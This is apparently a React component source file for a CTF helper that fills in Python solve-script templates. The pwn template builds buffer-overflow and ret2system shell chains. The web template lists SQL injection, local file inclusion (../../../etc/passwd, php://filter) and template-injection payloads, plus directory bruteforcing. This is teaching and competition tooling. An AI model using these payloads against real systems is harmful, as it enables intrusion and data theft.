import { useState } from 'react';
import { Code, Play, Copy, Check, Loader2, Sparkles, Download, AlertTriangle } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useToast } from '@/hooks/use-toast';
import { cn } from '@/lib/utils';
import * as api from '@/lib/api';

interface SolveScriptGeneratorProps {
  jobId: string;
  category?: string;
  files?: string[];
  flagFormat?: string;
  analysisContext?: string;
  onScriptExecuted?: (result: api.RunScriptResponse) => void;
}

interface GeneratedScript {
  code: string;
  description: string;
  packages: string[];
  category: string;
}

// Script templates based on challenge category
const SCRIPT_TEMPLATES: Record<string, GeneratedScript> = {
  crypto: {
    code: `#!/usr/bin/env python3
"""
CTF Crypto Solve Script
Auto-generated based on challenge analysis
"""
from Crypto.Util.number import long_to_bytes, inverse, GCD
from Crypto.PublicKey import RSA
import gmpy2
import base64
import codecs

def analyze_rsa(n, e, c=None):
    """Analyze RSA parameters for common vulnerabilities"""
    print(f"[*] Analyzing RSA: n={n}, e={e}")
    
    # Check for small e attack
    if e == 3:
        print("[!] Small e=3 detected - trying cube root attack")
        if c:
            m, exact = gmpy2.iroot(c, 3)
            if exact:
                print(f"[+] Decrypted: {long_to_bytes(int(m))}")
                return long_to_bytes(int(m))
    
    # Check for Wiener's attack (large e)
    if e > n // 3:
        print("[!] Large e detected - trying Wiener's attack")
    
    # Try factoring small n
    if n.bit_length() < 256:
        print("[!] Small n detected - trying factorization")
        # Try Fermat's factorization
        a = gmpy2.isqrt(n) + 1
        b2 = a*a - n
        while not gmpy2.is_square(b2):
            a += 1
            b2 = a*a - n
        b = gmpy2.isqrt(b2)
        p, q = int(a - b), int(a + b)
        print(f"[+] Factors: p={p}, q={q}")
        if c:
            phi = (p - 1) * (q - 1)
            d = inverse(e, phi)
            m = pow(c, d, n)
            print(f"[+] Decrypted: {long_to_bytes(m)}")
            return long_to_bytes(m)
    
    return None

def try_common_ciphers(data):
    """Try common classical ciphers"""
    results = []
    
    # Caesar cipher (all rotations)
    for rot in range(26):
        decoded = ''.join(
            chr((ord(c) - ord('A') + rot) % 26 + ord('A')) if c.isupper()
            else chr((ord(c) - ord('a') + rot) % 26 + ord('a')) if c.islower()
            else c
            for c in data
        )
        if 'FLAG' in decoded or 'CTF' in decoded:
            results.append(('Caesar', rot, decoded))
    
    # Base64
    try:
        decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
        if decoded and 'FLAG' in decoded or 'CTF' in decoded:
            results.append(('Base64', None, decoded))
    except:
        pass
    
    # ROT13
    decoded = codecs.decode(data, 'rot_13')
    if 'FLAG' in decoded or 'CTF' in decoded:
        results.append(('ROT13', None, decoded))
    
    return results

if __name__ == "__main__":
    print("[*] CTF Crypto Solve Script")
    print("=" * 50)
    
    # Add your challenge data here
    # Example:
    # n = 0x...
    # e = 65537
    # c = 0x...
    # analyze_rsa(n, e, c)
    
    # Or for classical ciphers:
    # data = "..."
    # results = try_common_ciphers(data)
    # for cipher, key, result in results:
    #     print(f"[+] {cipher} (key={key}): {result}")
`,
    description: 'RSA analysis and classical cipher solver',
    packages: ['pycryptodome', 'gmpy2'],
    category: 'crypto',
  },
  forensics: {
    code: `#!/usr/bin/env python3
"""
CTF Forensics Solve Script
Auto-generated based on challenge analysis
"""
import os
import sys
import struct
import binascii

def analyze_file_headers(filepath):
    """Check common file signatures"""
    signatures = {
        b'\\x89PNG': 'PNG image',
        b'\\xff\\xd8\\xff': 'JPEG image',
        b'GIF87a': 'GIF image (87a)',
        b'GIF89a': 'GIF image (89a)',
        b'PK\\x03\\x04': 'ZIP archive',
        b'\\x1f\\x8b': 'GZIP archive',
        b'BZh': 'BZIP2 archive',
        b'\\x7fELF': 'ELF binary',
        b'MZ': 'DOS/PE executable',
        b'%PDF': 'PDF document',
        b'RIFF': 'RIFF (WAV/AVI)',
    }
    
    with open(filepath, 'rb') as f:
        header = f.read(16)
    
    for sig, desc in signatures.items():
        if header.startswith(sig):
            return desc
    return 'Unknown'

def extract_strings(filepath, min_len=4):
    """Extract printable strings from binary"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    result = []
    current = []
    
    for byte in data:
        if 32 <= byte < 127:
            current.append(chr(byte))
        else:
            if len(current) >= min_len:
                result.append(''.join(current))
            current = []
    
    if len(current) >= min_len:
        result.append(''.join(current))
    
    return result

def find_flags(data, patterns=['CTF{', 'FLAG{', 'flag{']):
    """Search for flag patterns in data"""
    flags = []
    if isinstance(data, bytes):
        data = data.decode('utf-8', errors='ignore')
    
    for pattern in patterns:
        idx = 0
        while True:
            idx = data.find(pattern, idx)
            if idx == -1:
                break
            end = data.find('}', idx)
            if end != -1:
                flags.append(data[idx:end+1])
            idx += 1
    
    return flags

def check_lsb_stego(image_path):
    """Check for LSB steganography in images"""
    try:
        from PIL import Image
        img = Image.open(image_path)
        pixels = list(img.getdata())
        
        bits = []
        for pixel in pixels[:1000]:  # Check first 1000 pixels
            if isinstance(pixel, tuple):
                for channel in pixel[:3]:  # RGB
                    bits.append(channel & 1)
        
        # Convert bits to bytes
        bytes_data = []
        for i in range(0, len(bits) - 8, 8):
            byte = 0
            for j in range(8):
                byte |= bits[i + j] << (7 - j)
            bytes_data.append(byte)
        
        result = bytes(bytes_data)
        flags = find_flags(result)
        if flags:
            print(f"[+] LSB Stego found: {flags}")
            return flags
    except ImportError:
        print("[!] PIL not available")
    except Exception as e:
        print(f"[!] LSB check error: {e}")
    
    return None

if __name__ == "__main__":
    print("[*] CTF Forensics Solve Script")
    print("=" * 50)
    
    # Analyze files in current directory
    for filename in os.listdir('.'):
        if os.path.isfile(filename):
            print(f"\\n[*] Analyzing: {filename}")
            
            # File type
            ftype = analyze_file_headers(filename)
            print(f"    Type: {ftype}")
            
            # Extract strings and search for flags
            strings = extract_strings(filename, 8)
            flags = []
            for s in strings:
                flags.extend(find_flags(s))
            
            if flags:
                print(f"    [+] Flags found: {set(flags)}")
`,
    description: 'File analysis and steganography detection',
    packages: ['Pillow'],
    category: 'forensics',
  },
  pwn: {
    code: `#!/usr/bin/env python3
"""
CTF PWN Solve Script
Auto-generated based on challenge analysis
"""
from pwn import *

# Set context
context.arch = 'amd64'  # or 'i386'
context.os = 'linux'
context.log_level = 'info'

def find_offset(binary_path):
    """Find buffer overflow offset using cyclic pattern"""
    elf = ELF(binary_path)
    
    # Generate cyclic pattern
    pattern = cyclic(500)
    
    # Try to crash the binary
    io = process(binary_path)
    io.sendline(pattern)
    io.wait()
    
    # Get crash address from core dump if available
    core = io.corefile
    if core:
        rsp = core.rsp if context.arch == 'amd64' else core.esp
        offset = cyclic_find(rsp)
        print(f"[+] Offset found: {offset}")
        return offset
    
    return None

def build_rop_chain(binary_path, libc_path=None):
    """Build ROP chain for ret2libc or ret2system"""
    elf = ELF(binary_path)
    rop = ROP(elf)
    
    # Find gadgets
    if libc_path:
        libc = ELF(libc_path)
        rop_libc = ROP(libc)
        
        # ret2system chain
        if context.arch == 'amd64':
            # pop rdi; ret
            pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])
            system = libc.symbols['system']
            binsh = next(libc.search(b'/bin/sh'))
            
            chain = flat(
                pop_rdi,
                binsh,
                system
            )
            return chain
    
    return None

def format_string_exploit(offset, target_addr, value):
    """Generate format string payload"""
    # Calculate writes needed
    writes = {}
    for i in range(8):  # 64-bit
        writes[target_addr + i] = (value >> (i * 8)) & 0xff
    
    payload = fmtstr_payload(offset, writes)
    return payload

# Template exploit
def exploit():
    binary = './challenge'  # Update this
    
    # Load binary
    elf = ELF(binary)
    
    # Connect to target
    # io = remote('host', port)  # For remote
    io = process(binary)  # For local
    
    # Build payload
    offset = 72  # Update based on analysis
    payload = b'A' * offset
    
    # Add ROP chain or shellcode
    # payload += p64(elf.symbols['win'])  # ret2win
    # payload += shellcraft.sh()  # shellcode
    
    # Send payload
    io.sendline(payload)
    
    # Get shell
    io.interactive()

if __name__ == "__main__":
    print("[*] CTF PWN Solve Script")
    print("=" * 50)
    
    # Uncomment to run exploit
    # exploit()
`,
    description: 'Buffer overflow and ROP chain builder',
    packages: ['pwntools'],
    category: 'pwn',
  },
  rev: {
    code: `#!/usr/bin/env python3
"""
CTF Reverse Engineering Solve Script
Auto-generated based on challenge analysis
"""
import struct
import sys

def analyze_elf(filepath):
    """Basic ELF header analysis"""
    with open(filepath, 'rb') as f:
        magic = f.read(4)
        if magic != b'\\x7fELF':
            print(f"[!] Not an ELF file")
            return None
        
        bits = f.read(1)[0]  # 1 = 32-bit, 2 = 64-bit
        endian = f.read(1)[0]  # 1 = little, 2 = big
        
        print(f"[*] ELF {'64' if bits == 2 else '32'}-bit")
        print(f"[*] {'Little' if endian == 1 else 'Big'} endian")
        
        return {'bits': bits, 'endian': endian}

def deobfuscate_xor(data, key):
    """XOR deobfuscation"""
    if isinstance(key, int):
        return bytes(b ^ key for b in data)
    else:
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def find_flag_check(binary_path):
    """Look for flag validation patterns"""
    with open(binary_path, 'rb') as f:
        data = f.read()
    
    patterns = [
        b'strcmp',
        b'strncmp', 
        b'memcmp',
        b'Correct',
        b'Wrong',
        b'Invalid',
        b'CTF{',
        b'FLAG{',
    ]
    
    found = []
    for pattern in patterns:
        if pattern in data:
            found.append(pattern.decode('utf-8', errors='ignore'))
    
    return found

def brute_force_check(check_func, charset, length):
    """Brute force flag character by character"""
    import itertools
    
    flag = ""
    for pos in range(length):
        for c in charset:
            test = flag + c + 'A' * (length - len(flag) - 1)
            if check_func(test, pos):
                flag += c
                print(f"[+] Found char {pos}: {c}")
                break
    
    return flag

def angr_solve(binary_path, find_addr, avoid_addrs=None):
    """Use angr to solve for input"""
    try:
        import angr
        import claripy
        
        proj = angr.Project(binary_path, auto_load_libs=False)
        
        # Symbolic input
        flag_len = 32
        flag = claripy.BVS('flag', flag_len * 8)
        
        # Initial state
        state = proj.factory.entry_state(stdin=flag)
        
        # Constraints for printable characters
        for i in range(flag_len):
            state.solver.add(flag.get_byte(i) >= 0x20)
            state.solver.add(flag.get_byte(i) <= 0x7e)
        
        # Simulation
        simgr = proj.factory.simgr(state)
        simgr.explore(find=find_addr, avoid=avoid_addrs or [])
        
        if simgr.found:
            solution = simgr.found[0]
            return solution.solver.eval(flag, cast_to=bytes)
        
    except ImportError:
        print("[!] angr not available")
    
    return None

if __name__ == "__main__":
    print("[*] CTF Reverse Engineering Solve Script")
    print("=" * 50)
    
    if len(sys.argv) < 2:
        print("Usage: python solve.py <binary>")
        sys.exit(1)
    
    binary = sys.argv[1]
    
    # Analyze ELF
    info = analyze_elf(binary)
    
    # Look for patterns
    patterns = find_flag_check(binary)
    print(f"[*] Found patterns: {patterns}")
`,
    description: 'Binary analysis and symbolic execution',
    packages: ['angr', 'z3-solver'],
    category: 'rev',
  },
  web: {
    code: `#!/usr/bin/env python3
"""
CTF Web Solve Script
Auto-generated based on challenge analysis
"""
import requests
import re
from urllib.parse import urljoin, quote

def sql_injection_test(url, param='id'):
    """Test for SQL injection vulnerabilities"""
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "1' AND '1'='1",
    ]
    
    results = []
    for payload in payloads:
        resp = requests.get(url, params={param: payload})
        if any(x in resp.text.lower() for x in ['error', 'mysql', 'sqlite', 'syntax']):
            results.append(('Error-based', payload, resp.text[:200]))
        elif len(resp.text) != len(requests.get(url, params={param: '1'}).text):
            results.append(('Content-based', payload, 'Different response length'))
    
    return results

def lfi_test(url, param='file'):
    """Test for Local File Inclusion"""
    payloads = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd%00',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
    ]
    
    results = []
    for payload in payloads:
        resp = requests.get(url, params={param: payload})
        if 'root:' in resp.text:
            results.append(('LFI', payload, '/etc/passwd found'))
        elif 'PD9waH' in resp.text:  # base64 of <?ph
            results.append(('LFI-base64', payload, 'PHP source leaked'))
    
    return results

def ssti_test(url, param='name'):
    """Test for Server-Side Template Injection"""
    payloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '{{self.__class__.__mro__[2].__subclasses__()}}',
    ]
    
    results = []
    for payload in payloads:
        resp = requests.get(url, params={param: payload})
        if '49' in resp.text:
            results.append(('SSTI', payload, 'Math evaluated'))
        elif 'SECRET_KEY' in resp.text:
            results.append(('SSTI-config', payload, 'Config leaked'))
    
    return results

def find_flags_in_response(text, patterns=['CTF{', 'FLAG{', 'flag{']):
    """Extract flags from response"""
    flags = []
    for pattern in patterns:
        regex = pattern.replace('{', '\\{') + r'[^}]+}'
        matches = re.findall(regex, text)
        flags.extend(matches)
    return flags

def directory_bruteforce(base_url, wordlist=None):
    """Simple directory bruteforce"""
    if wordlist is None:
        wordlist = [
            'admin', 'login', 'dashboard', 'api', 'backup',
            'config', 'flag', 'flag.txt', 'robots.txt',
            '.git', '.env', 'debug', 'test', 'dev',
        ]
    
    found = []
    for word in wordlist:
        url = urljoin(base_url, word)
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code != 404:
                found.append((word, resp.status_code, len(resp.text)))
        except:
            pass
    
    return found

if __name__ == "__main__":
    print("[*] CTF Web Solve Script")
    print("=" * 50)
    
    # Update target URL
    TARGET = "http://localhost:8080"
    
    # Directory scan
    print("\\n[*] Directory bruteforce...")
    dirs = directory_bruteforce(TARGET)
    for path, status, length in dirs:
        print(f"    [{status}] /{path} ({length} bytes)")
    
    # Check for vulnerabilities
    # results = sql_injection_test(f"{TARGET}/search", 'q')
    # results = lfi_test(f"{TARGET}/view", 'page')
    # results = ssti_test(f"{TARGET}/greet", 'name')
`,
    description: 'Web vulnerability testing and exploitation',
    packages: ['requests', 'beautifulsoup4'],
    category: 'web',
  },
  misc: {
    code: `#!/usr/bin/env python3
"""
CTF Misc Solve Script
Auto-generated for general puzzle solving
"""
import base64
import codecs
import string

def decode_all(data):
    """Try all common encodings"""
    results = {}
    
    # Base64
    try:
        results['base64'] = base64.b64decode(data).decode('utf-8', errors='ignore')
    except:
        pass
    
    # Base32
    try:
        results['base32'] = base64.b32decode(data).decode('utf-8', errors='ignore')
    except:
        pass
    
    # Hex
    try:
        results['hex'] = bytes.fromhex(data).decode('utf-8', errors='ignore')
    except:
        pass
    
    # ROT13
    results['rot13'] = codecs.decode(data, 'rot_13')
    
    # Binary to text
    if all(c in '01 ' for c in data):
        try:
            bits = data.replace(' ', '')
            chars = [chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)]
            results['binary'] = ''.join(chars)
        except:
            pass
    
    # Morse code
    morse_dict = {
        '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
        '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
        '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
        '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
        '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
        '--..': 'Z'
    }
    if all(c in '.-/ ' for c in data):
        try:
            words = data.split('/')
            decoded = []
            for word in words:
                letters = word.strip().split(' ')
                decoded.append(''.join(morse_dict.get(l, '?') for l in letters if l))
            results['morse'] = ' '.join(decoded)
        except:
            pass
    
    return results

def frequency_analysis(text):
    """Perform frequency analysis for substitution ciphers"""
    freq = {}
    for c in text.lower():
        if c in string.ascii_lowercase:
            freq[c] = freq.get(c, 0) + 1
    
    total = sum(freq.values())
    return {k: v/total*100 for k, v in sorted(freq.items(), key=lambda x: -x[1])}

def caesar_all(text):
    """Try all Caesar cipher rotations"""
    results = []
    for i in range(26):
        decoded = ''
        for c in text:
            if c.isalpha():
                base = ord('A') if c.isupper() else ord('a')
                decoded += chr((ord(c) - base + i) % 26 + base)
            else:
                decoded += c
        results.append((i, decoded))
    return results

def vigenere_decrypt(ciphertext, key):
    """Decrypt Vigenère cipher"""
    result = []
    key_idx = 0
    for c in ciphertext:
        if c.isalpha():
            shift = ord(key[key_idx % len(key)].upper()) - ord('A')
            if c.isupper():
                result.append(chr((ord(c) - ord('A') - shift) % 26 + ord('A')))
            else:
                result.append(chr((ord(c) - ord('a') - shift) % 26 + ord('a')))
            key_idx += 1
        else:
            result.append(c)
    return ''.join(result)

if __name__ == "__main__":
    print("[*] CTF Misc Solve Script")
    print("=" * 50)
    
    # Your encoded data here
    data = "Q1RGe3RoMXNfMXNfYV90ZXN0fQ=="
    
    print("\\n[*] Trying all decodings...")
    results = decode_all(data)
    for encoding, decoded in results.items():
        if decoded and len(decoded) > 2:
            print(f"    {encoding}: {decoded}")
            if 'CTF{' in decoded or 'FLAG{' in decoded:
                print(f"\\n[+] FLAG FOUND: {decoded}")
`,
    description: 'Encoding/decoding and puzzle solving utilities',
    packages: [],
    category: 'misc',
  },
};

export function SolveScriptGenerator({
  jobId,
  category = 'misc',
  files = [],
  flagFormat = 'CTF{...}',
  analysisContext,
  onScriptExecuted,
}: SolveScriptGeneratorProps) {
  const { toast } = useToast();
  const [script, setScript] = useState<string>('');
  const [packages, setPackages] = useState<string[]>([]);
  const [isGenerating, setIsGenerating] = useState(false);
  const [isExecuting, setIsExecuting] = useState(false);
  const [copied, setCopied] = useState(false);
  const [executionResult, setExecutionResult] = useState<api.RunScriptResponse | null>(null);
  const [customPackages, setCustomPackages] = useState('');

  const generateScript = () => {
    setIsGenerating(true);
    
    // Simulate AI generation delay
    setTimeout(() => {
      const template = SCRIPT_TEMPLATES[category] || SCRIPT_TEMPLATES.misc;
      
      // Customize script based on context
      let customizedScript = template.code;
      
      // Add file context
      if (files.length > 0) {
        const fileList = files.map(f => `# - ${f}`).join('\n');
        customizedScript = customizedScript.replace(
          '"""',
          `"""\n\n# Challenge Files:\n${fileList}\n# Flag Format: ${flagFormat}`
        );
      }
      
      // Add analysis context
      if (analysisContext) {
        customizedScript = customizedScript.replace(
          'if __name__ == "__main__":',
          `# AI Analysis Context:\n# ${analysisContext.slice(0, 500).replace(/\n/g, '\n# ')}\n\nif __name__ == "__main__":`
        );
      }
      
      setScript(customizedScript);
      setPackages(template.packages);
      setIsGenerating(false);
      
      toast({
        title: 'Script Generated',
        description: `Generated ${template.category} solve script with ${template.packages.length} packages`,
      });
    }, 800);
  };

  const copyToClipboard = async () => {
    await navigator.clipboard.writeText(script);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: 'Copied!',
      description: 'Script copied to clipboard',
    });
  };

  const downloadScript = () => {
    const blob = new Blob([script], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `solve_${category}.py`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const executeScript = async () => {
    if (!script) return;
    
    setIsExecuting(true);
    setExecutionResult(null);
    
    try {
      // Parse custom packages
      const allPackages = [
        ...packages,
        ...customPackages.split(',').map(p => p.trim()).filter(Boolean)
      ];
      
      const result = await api.runPythonScript({
        script,
        pip_packages: allPackages,
        timeout: 60,
      });
      
      setExecutionResult(result);
      onScriptExecuted?.(result);
      
      toast({
        title: result.exit_code === 0 ? 'Execution Complete' : 'Execution Failed',
        description: result.exit_code === 0 
          ? 'Script executed successfully' 
          : `Exit code: ${result.exit_code}`,
        variant: result.exit_code === 0 ? 'default' : 'destructive',
      });
    } catch (error) {
      toast({
        title: 'Execution Failed',
        description: error instanceof Error ? error.message : 'Unknown error',
        variant: 'destructive',
      });
    } finally {
      setIsExecuting(false);
    }
  };

  return (
    <Card className="border-border">
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <CardTitle className="flex items-center gap-2 text-base">
            <Sparkles className="h-4 w-4 text-primary" />
            AI Solve Script Generator
          </CardTitle>
          <Badge variant="outline" className="text-xs capitalize">
            {category}
          </Badge>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* Generate Button */}
        {!script && (
          <div className="text-center py-6">
            <p className="text-sm text-muted-foreground mb-4">
              Generate a Python solve script based on challenge analysis
            </p>
            <Button 
              onClick={generateScript} 
              disabled={isGenerating}
              className="gap-2"
            >
              {isGenerating ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" />
                  Generating...
                </>
              ) : (
                <>
                  <Code className="h-4 w-4" />
                  Generate Solve Script
                </>
              )}
            </Button>
          </div>
        )}

        {/* Script Editor */}
        {script && (
          <>
            <div className="relative">
              <div className="absolute right-2 top-2 flex gap-1 z-10">
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-7 w-7"
                  onClick={copyToClipboard}
                >
                  {copied ? (
                    <Check className="h-3.5 w-3.5 text-success" />
                  ) : (
                    <Copy className="h-3.5 w-3.5" />
                  )}
                </Button>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-7 w-7"
                  onClick={downloadScript}
                >
                  <Download className="h-3.5 w-3.5" />
                </Button>
              </div>
              <ScrollArea className="h-64 border border-border rounded-lg">
                <Textarea
                  value={script}
                  onChange={(e) => setScript(e.target.value)}
                  className="min-h-[256px] font-mono text-xs resize-none border-0 focus-visible:ring-0"
                  placeholder="Python script will appear here..."
                />
              </ScrollArea>
            </div>

            {/* Packages */}
            <div className="space-y-2">
              <Label className="text-xs text-muted-foreground">
                Required Packages
              </Label>
              <div className="flex flex-wrap gap-1.5">
                {packages.map((pkg) => (
                  <Badge key={pkg} variant="secondary" className="text-xs">
                    {pkg}
                  </Badge>
                ))}
                {packages.length === 0 && (
                  <span className="text-xs text-muted-foreground">
                    No additional packages required
                  </span>
                )}
              </div>
              <Input
                placeholder="Additional packages (comma-separated)"
                value={customPackages}
                onChange={(e) => setCustomPackages(e.target.value)}
                className="text-xs h-8"
              />
            </div>

            {/* Action Buttons */}
            <div className="flex gap-2">
              <Button
                onClick={executeScript}
                disabled={isExecuting}
                className="flex-1 gap-2"
              >
                {isExecuting ? (
                  <>
                    <Loader2 className="h-4 w-4 animate-spin" />
                    Executing in Sandbox...
                  </>
                ) : (
                  <>
                    <Play className="h-4 w-4" />
                    Execute in Sandbox
                  </>
                )}
              </Button>
              <Button
                variant="outline"
                onClick={generateScript}
                disabled={isGenerating}
              >
                Regenerate
              </Button>
            </div>

            {/* Execution Result */}
            {executionResult && (
              <div className="space-y-2">
                <Label className="text-xs text-muted-foreground flex items-center gap-2">
                  Execution Result
                  <Badge 
                    variant={executionResult.exit_code === 0 ? 'default' : 'destructive'}
                    className="text-[10px]"
                  >
                    Exit: {executionResult.exit_code}
                  </Badge>
                </Label>
                
                {executionResult.stdout && (
                  <ScrollArea className="h-32 border border-border rounded-lg bg-muted/50">
                    <pre className="p-3 text-xs font-mono whitespace-pre-wrap">
                      {executionResult.stdout}
                    </pre>
                  </ScrollArea>
                )}
                
                {executionResult.stderr && (
                  <Alert variant="destructive" className="py-2">
                    <AlertTriangle className="h-3.5 w-3.5" />
                    <AlertDescription className="text-xs font-mono">
                      {executionResult.stderr.slice(0, 500)}
                    </AlertDescription>
                  </Alert>
                )}
              </div>
            )}
          </>
        )}
      </CardContent>
    </Card>
  );
}
